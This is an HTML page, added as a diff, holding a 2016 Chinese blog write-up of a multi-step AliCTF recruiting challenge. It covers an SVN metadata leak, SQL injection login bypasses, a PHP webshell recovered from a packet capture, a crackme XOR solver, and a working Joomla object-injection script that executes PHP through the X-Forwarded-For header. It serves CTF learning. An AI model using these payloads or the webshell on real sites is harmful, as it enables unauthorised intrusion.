@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>This is AliCTF? | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="This is AliCTF?">
+<meta property="og:url" content="http://0x48.pw/2016/03/15/0x13/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。">
+<meta property="og:image" content="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png">
+<meta property="og:image" content="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf1.png">
+<meta property="og:updated_time" content="2016-03-28T10:19:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="This is AliCTF?">
+<meta name="twitter:description" content="这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。">
+<meta name="twitter:image" content="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x13" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/15/0x13/" class="article-date">
+      <time datetime="2016-03-15T00:35:30.000Z" itemprop="datePublished">2016-03-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      This is AliCTF?
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
+<blockquote>
+<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br><a id="more"></a></p>
+</blockquote>
+<h1 id="Step-0"><a href="#Step-0" class="headerlink" title="Step 0"></a>Step 0</h1><p>上图中的base64解码呗。。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"aHR0cDovLzIxOC4yNDQuMTQzLjE5OC8="</span> | base64 <span class="_">-d</span></span></div><div class="line">http://218.244.143.198/</div></pre></td></tr></table></figure></p>
+<p>打开来是一个 伪造？ 的sqlmap网站，右键查看源码， 有一坨jsfuck，太长了，这里就不贴了。。直接丢F12里面的console运行，得到：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">218.244</span><span class="number">.143</span><span class="number">.198</span>/.svn/</div></pre></td></tr></table></figure></p>
+<p>那就svn泄露呗，记得以前做过这样的题，记不清楚了，google一下，</p>
+<blockquote>
+<p>现实的开发环境中，强烈建议使用导出功能svn export而不是svn co。由此可能导致非常严重的问题，很多管理员直接吧svn co出来的代码直接放到web目录下。这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的“entries”文件，逐步摸清站点结构。</p>
+</blockquote>
+<p>所以接下来就是访问 <code>http://218.244.143.198/.svn/entries</code>, 得到<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">12</span></div><div class="line">This <span class="keyword">is</span> lastest <span class="built_in">version</span> SVN, U know wc.db?</div></pre></td></tr></table></figure></p>
+<p>然后访问 <code>http://218.244.143.198/.svn/wc.db</code> 把这文件下下来，这文件是svn的sqlite数据库，然后装了一个这个数据库的浏览器。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install sqlitebrowser</span></div></pre></td></tr></table></figure></p>
+<p>然后用这个打开wc.db，然后关于这个数据库的问题网上随便都搜的到，然后找到一篇wp: <a href="http://bobao.360.cn/learning/detail/129.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/129.html</a><br>发现一个页面：<code>66666/index.php</code> 不过这wp中说的源码泄露没发现，所以直接去访问看看。。</p>
+<p>好了。。。这时候该问。。最短的payload的是啥？讲道理，我觉得是 <code>&#39;=&#39;</code>, 可是竟然不跟我讲道理。。。所以我觉得最短的是<code>&#39;=&#39;&#39;#</code>还有<code>&#39;||1#</code> , 然后得到<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hack <span class="keyword">it</span> <span class="built_in">to</span> make money! GoGoGo~ <span class="keyword">http</span>://<span class="number">218.244</span><span class="number">.143</span><span class="number">.198</span>/zootopia/</div></pre></td></tr></table></figure></p>
+<p>。。这。。懵逼了一会，随便看了看默认的是啥。。。发现是一串md5: <code>d41b8265807ce33038df2b3f7aa9fb10</code><br>丢cmd5上，接出来是aliyun, 试试，(⊙v⊙)。。。。对了<br>得到一个文件:<code>c0ngrats.txt</code>, 打开来看看，得知后面还有3题，和下一题的题目地址：<code>http://218.244.143.198/static/backdoor.zip</code></p>
+<h1 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h1><p>下载下来解压出来是一个数据包，数据流量审计题。。关于这类的题，我觉得很蛋疼。要不然很简单，比如http这样明文传输的协议的审计，要不然再难一点，加上802.11无线协议，但是这种爆破密码就没意思了，不设密码又太简单。要不然就是很难的审计加密协议。。所以hctf的时候我就没出流量审计的题目。</p>
+<p>这题呢，就属于那种就简单的把，先过滤出来http协议，然后发现第一个backdoor.php，然后整理了下这个后门的源码<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="symbol">@ini_set</span>(<span class="string">"display_errors"</span>,<span class="string">"0"</span>)<span class="comment">;</span></div><div class="line"><span class="symbol">@set_time_limit</span>(<span class="number">0</span>)<span class="comment">;</span></div><div class="line"><span class="symbol">@set_magic_quotes_runtime</span>(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">echo(<span class="string">"-&gt;|"</span>)<span class="comment">;</span></div><div class="line">$D=base64_decode($_POST[<span class="string">"z1"</span>])<span class="comment">;</span></div><div class="line">$F=<span class="symbol">@opendir</span>($D)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span>($F==<span class="literal">NULL</span>) &#123;</div><div class="line">	echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>)<span class="comment">;</span></div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">	$M=<span class="literal">NULL</span><span class="comment">;</span></div><div class="line">	$L=<span class="literal">NULL</span><span class="comment">;</span></div><div class="line">	<span class="keyword">while</span>($N=<span class="symbol">@readdir</span>($F)) &#123;</div><div class="line">		$P=$D.<span class="string">"/"</span>.$N<span class="comment">;</span></div><div class="line">		$T=<span class="symbol">@date</span>(<span class="string">"Y-m-d H:i:s"</span>,<span class="symbol">@filemtime</span>($P))<span class="comment">;</span></div><div class="line">		@$E=substr(base_convert(<span class="symbol">@fileperms</span>($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>)<span class="comment">;</span></div><div class="line">		$R=<span class="string">"\t"</span>.$T.<span class="string">"\t"</span>.<span class="symbol">@filesize</span>($P).<span class="string">"\t"</span>.$E.<span class="string">"\n"</span><span class="comment">;</span></div><div class="line">		<span class="keyword">if</span>(<span class="symbol">@is_dir</span>($P)) $M.=$N.<span class="string">"/"</span>.$R<span class="comment">;</span></div><div class="line">		<span class="keyword">else</span> $L.=$N.$R<span class="comment">;</span></div><div class="line">	&#125;</div><div class="line">	echo $M.$L<span class="comment">;</span></div><div class="line">	<span class="symbol">@closedir</span>($F)<span class="comment">;</span></div><div class="line">&#125;<span class="comment">;</span></div><div class="line">echo(<span class="string">"|&lt;-"</span>)<span class="comment">;</span></div><div class="line">die()<span class="comment">; </span></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>然后发现ip和该题的题目链接ip一样，去试试，没有这后门文件，那就从数据包入手。右击 -&gt; Follow TCP Stream<br>得到另一个文件<code>wllm</code>, 访问得<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">find</span> data <span class="keyword">package</span> careful, you will <span class="keyword">find</span> <span class="keyword">next</span> level url , that will be a crackme</div></pre></td></tr></table></figure></p>
+<p>所以说下一题的入口还是在数据包里。。。看着一坨的http包，好吧，继续过滤 <code>http &amp;&amp; ip.addr==218.244.143.198</code><br>然后从第四个POST包中的参数z2中得到下一题的入口：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"YUhSMGNEb3ZMekl4T0M0eU5EUXVNVFF6TGpFNU9DOXpkR0YwYVdNdlkzSmhZMnR0WlE9PQ=="</span> | base64 <span class="_">-d</span>| base64 <span class="_">-d</span></span></div><div class="line">http://218.244.143.198/static/crackme</div></pre></td></tr></table></figure></p>
+<h1 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h1><p>linux64位逆向题呗。。。比Z神出的简单多了，直接丢到ida中，F5，关键部分如图所示<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf1.png" alt="alictf1"><br>payload:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># crack.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">secret = [0x8, 0x45, 0x0A, 0x42, 0x4b, 0x31, 0x6d, 0x2f, 0x52, 0x0b, 0x16, 0x23] </div><div class="line">secret1 = [0x73, 0x64, 0x66, 0x23, 0x6b, 0x6c, 0x25, 0x72, 0x29, 0x6b, 0x73, 0x6b]</div><div class="line">result = <span class="string">""</span></div><div class="line"></div><div class="line">for x in range(12):</div><div class="line">	tmp = secret[x] ^ secret1[x] ^ 0xF</div><div class="line">	result += chr(tmp)</div><div class="line"></div><div class="line">result += <span class="string">"a"</span></div><div class="line">print result</div><div class="line"><span class="comment"># $ python crack.py | ./crackme</span></div><div class="line"><span class="comment"># I want ur password:Yes!</span></div><div class="line"><span class="comment"># $ python crack.py</span></div><div class="line"><span class="comment"># t.cn/RGRtojGa</span></div></pre></td></tr></table></figure></p>
+<p>去掉最后的a，就是下一题的入口了</p>
+<h1 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h1><p><a href="http://112.124.106.246/7fbde8d70c816033/index.php" target="_blank" rel="external">http://112.124.106.246/7fbde8d70c816033/index.php</a><br>打开来一看是…..Joomla。。。。。。。。。。<br>0CTF的piapiapia那题搜关于php序列化的漏洞搜出来的全是这个博客的反序列化截断漏洞。。。。<br>然后发现这漏洞阿里云还写了分析报告，好了。。。估计就是这洞了。。。<br>payload:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># payload.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">import requests</div><div class="line"></div><div class="line">url = <span class="string">"http://112.124.106.246/7fbde8d70c816033/index.php"</span></div><div class="line">header = &#123;</div><div class="line">	<span class="string">"X-Forwarded-For"</span>: '&#125;__test|O:21:<span class="string">"JDatabaseDriverMysqli"</span>:3:&#123;s:2:<span class="string">"fc"</span>;O:17:<span class="string">"JSimplepieFactory"</span>:0:&#123;&#125;s:21:<span class="string">"\\0\\0\\0disconnectHandlers"</span>;a:1:&#123;i:0;a:2:&#123;i:0;O:9:<span class="string">"SimplePie"</span>:5:&#123;s:8:<span class="string">"sanitize"</span>;O:20:<span class="string">"JDatabaseDriverMysql"</span>:0:&#123;&#125;s:8:<span class="string">"feed_url"</span>;s:37:<span class="string">"phpinfo();JFactory::getConfig();exit;"</span>;s:19:<span class="string">"cache_name_function"</span>;s:6:<span class="string">"assert"</span>;s:5:<span class="string">"cache"</span>;b:1;s:11:<span class="string">"cache_class"</span>;O:20:<span class="string">"JDatabaseDriverMysql"</span>:0:&#123;&#125;&#125;i:1;s:4:<span class="string">"init"</span>;&#125;&#125;s:13:<span class="string">"\\0\\0\\0connection"</span>;b:1;&#125;\xf0',</div><div class="line">&#125;</div><div class="line"></div><div class="line">req = requests.get(url, headers=header)</div><div class="line">print req.content</div><div class="line"><span class="comment"># $ python payload.py</span></div><div class="line"><span class="comment"># Success! key:xxxxxxxxxxxxxxxxxxxxx 发简历时附加此key有加分</span></div></pre></td></tr></table></figure></p>
+<p>撸了两节课撸完了。。。还是继续研究0CTF去了。。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/03/15/0x13/">This is AliCTF?</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-03-15, 08:35:30</p>
+        <p><span>最后更新:</span>2016-03-28, 18:19:02</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/03/15/0x13/" title="This is AliCTF?">http://0x48.pw/2016/03/15/0x13/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/03/15/0x13/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/03/17/0x14/">
+                    0CTF RSA?总结 || RSA学习笔记
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/03/14/0x12/">
+                    0CTF总结
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-0"><span class="toc-number">1.</span> <span class="toc-text">Step 0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-1"><span class="toc-number">2.</span> <span class="toc-text">Step 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-2"><span class="toc-number">3.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-3"><span class="toc-number">4.</span> <span class="toc-text">Step 3</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/03/17/0x14/" title="上一篇: 0CTF RSA?总结 || RSA学习笔记">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/03/14/0x12/" title="下一篇: 0CTF总结">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a 